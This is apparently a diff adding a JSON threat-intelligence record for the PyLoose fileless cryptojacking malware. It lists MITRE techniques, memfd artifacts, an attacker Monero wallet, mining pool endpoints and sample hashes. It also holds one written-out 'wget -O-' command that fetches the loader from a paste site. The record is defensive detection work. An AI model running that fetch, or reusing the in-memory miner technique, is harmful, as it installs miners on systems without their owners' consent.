@@ -1,0 +1,150 @@
+{
+  "malware_family": "PyLoose",
+  "threat_actor": "",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "PyLoose is a Python-based fileless attack targeting cloud workloads. It downloads a Python script from a paste site, which then decodes and decompresses a pre-compiled XMRig miner. The miner is loaded directly into memory using the memfd Linux feature and executed for cryptojacking.",
+  "mitre_techniques": [
+    "T1105",
+    "T1102",
+    "T1140",
+    "T1027.002",
+    "T1620",
+    "T1496"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "process_name",
+      "value": "smd",
+      "context": "argv[0] for in-memory XMRig process via execve.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "fileless-elf-exec",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/proc/self/fd/*",
+      "context": "Path used in execve to run in-memory ELF.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "fileless-elf-exec",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/memfd:*",
+      "context": "Prefix for symbolic link at /proc/{pid}/exe for memfd processes.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "wget -O- https://paste.c-net.org/chattingloosened",
+      "context": "Initial attempt to download payload from paste site.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "319",
+      "context": "Syscall number for memfd_create (on x86_64 Linux).",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "fileless-elf-exec",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "85DS3ShGZwtFffeQUrDK8Db12qwCcaCHofNcZdjMkjTCfWiRv9WLe4cR2W97eGnRXwBxDhTK7BbbE2Z7t4gjXRz1VLPmhn7",
+      "context": "Attacker's Monero wallet address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "https://paste.c-net.org/chattingloosened",
+      "context": "Hosted the PyLoose Python loader script.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "paste.c-net.org",
+      "context": "Pastebin-equivalent site hosting the loader.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "51.75.64.249",
+      "context": "MoneroOcean mining pool IP.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "51.75.64.249:20128",
+      "context": "Miner pool network endpoint.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "gulf.moneroocean.stream",
+      "context": "Cryptomining pool network endpoint.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pool.sabu-sabu.ml",
+      "context": "Cryptomining pool network endpoint.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pool.xiao.my.id",
+      "context": "Cryptomining pool network endpoint.",
+      "specificity": "low",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "25232290fa9fa5529240a4e893ce206dfdcfc28d0b3a1b89389f7270f1046822",
+      "description": "PyLoose Python loader script"
+    },
+    {
+      "sha256": "935ee206846223e6d2db3f62d05101c0bea741e7b43e1b73c1eb008f947d5ff1",
+      "description": "XMRig payload (in-memory ELF)"
+    }
+  ],
+  "file_types": [
+    "script",
+    "elf"
+  ]
+}
